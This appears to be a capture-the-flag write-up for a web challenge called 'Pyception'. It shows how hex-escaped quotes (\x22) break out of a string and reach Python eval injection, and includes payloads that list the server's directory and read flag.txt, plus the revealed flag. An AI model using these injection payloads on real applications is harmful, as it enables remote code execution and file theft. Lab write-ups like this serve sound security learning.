# Pyception

## Description

My friend loved making lame ahh dad jokes. so I made a website for him where I rated how lame his Dad jokes quotes were. Try it out

Author: @hyp3rd1a6lo

Flag Format: 0CTF{...}

## Flag

```
0CTF{0n3_Pyth0n_T0_Rul3_Th3m_All!}
```

## Solution

At first no exploits seem to work. The challenge is essentially reduced to closing the double quotes without using `"`.

After testing a fair bit we find that we can use escape codes for the ASCII values of the chars.

For example, `"\x41"` results in `A - Brilliantly said!`.

Using the escape code for a `"` in the following series of tests gives:

```
"\x22 + 'abc' + \x22"
abc - Absolutely spot on!
```

```
"\x22 + str(3 + 3) + \x22"
6 - Brilliantly said!
```

Still don't know why this one did not work.

```
"\x22 + str(__line__) + \x22"
:< Do not mess with syntax
```

```
"\x22 + str(eval('4 + 4')) + \x22"
8 - Absolutely spot on!
```

```
"\x22 + str(eval('__file__')) + \x22"
app.py - Couldn't agree more!
```

We can list out the directory content like:

```
"\x22 + str(eval('''list(__import__('os').walk('.'))''')) + \x22"
[('.', ['static', 'templates'], ['Dockerfile', 'app.py', 'requirements.txt']), ('./static', [], ['flag.txt', 'style.css']), ('./templates', [], ['index.html'])] - That's pure wisdom! 
```

And we can read the `flag.txt` file like:

```
"\x22 + str(eval('''open('./static/flag.txt').read()''')) + \x22"
 0CTF{0n3_Pyth0n_T0_Rul3_Th3m_All!} - That's pure wisdom! 
```

## References

## Attachments
